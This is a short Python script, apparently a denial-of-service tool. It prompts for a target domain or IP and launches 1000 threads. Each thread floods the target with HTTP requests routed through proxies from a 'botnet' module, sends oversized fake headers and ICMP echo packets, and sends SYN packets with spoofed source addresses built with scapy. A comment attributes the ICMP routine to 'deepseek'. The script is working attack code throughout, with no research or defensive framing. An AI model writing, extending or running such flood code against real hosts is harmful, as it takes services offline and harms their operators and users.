import random
import sys
import threading
import requests
from fake_headers import Headers
from botnet import proxies
import os
import socket
import struct
from scapy.all import *
import time
from loguru import logger


# ICMP flood system by deepseek
def checksum(data):
    sum = 0
    for i in range(0, len(data), 2):
        if i + 1 < len(data):
            word = (data[i] << 8) + data[i + 1]
        else:
            word = data[i] << 8
        sum += word
    sum = (sum >> 16) + (sum & 0xffff)
    sum += sum >> 16
    return ~sum & 0xffff


def send_icmp_echo(dest_addr, payload, identifier=os.getpid(), sequence=1):
    """Отправка ICMP-эхо запроса."""
    icmp_socket = socket.socket(
        socket.AF_INET,
        socket.SOCK_RAW,
        socket.IPPROTO_ICMP
    )

    icmp_type = 8
    icmp_code = 0
    icmp_checksum = 0
    icmp_id = identifier & 0xffff
    icmp_seq = sequence & 0xffff

    header = struct.pack(
        "!BBHHH",
        icmp_type,
        icmp_code,
        icmp_checksum,
        icmp_id,
        icmp_seq
    )
    payload_bytes = payload.encode("utf-8")

    icmp_checksum = checksum(header + payload_bytes)

    header = struct.pack(
        "!BBHHH",
        icmp_type,
        icmp_code,
        icmp_checksum,
        icmp_id,
        icmp_seq
    )

    icmp_socket.sendto(header + payload_bytes, (dest_addr, 1))

count = 0
host = str(input("Domain or ip >>> "))


def ddos(th_num, count, f):
    while True:
        try:
            s = requests.session()
            s.proxies = {"http": random.choice(proxies)}
            s.headers = f.generate()
            count += 1
            payloads = f.generate()
            payloads["payload2"] = """Àßñÿ"""*1024
            payloads["payload3"] = """§©®±"""*1024
            res = s.get(f"http://{host}", headers=payloads, timeout=5, proxies={"http": random.choice(proxies)})
            logger.debug(f"[ATTEMPT {count}] | (THREAD {th_num})\t| Success send | {res}")
            send_icmp_echo(f"{host}", " "*1024)
            logger.debug(f"[ATTEMPT {count}] | (THREAD {th_num})\t| ICMP-echo package success!")
            ip = IP(dst=host, src=random.choice(proxies).split(":")[0])
            tcp = TCP(sport=RandShort(), dport=80, flags="S")
            raw = Raw(b"X" * 1024)
            p = ip / tcp / raw
            send(p, loop=10, verbose=0)
            logger.debug(f"[ATTEMPT {count}] | (THREAD {th_num})\t| SYN package success!")
        except:
            logger.success("Server not responding")


for i in range(1000):
    threading.Thread(target=ddos, args=[i, count, Headers()]).start()
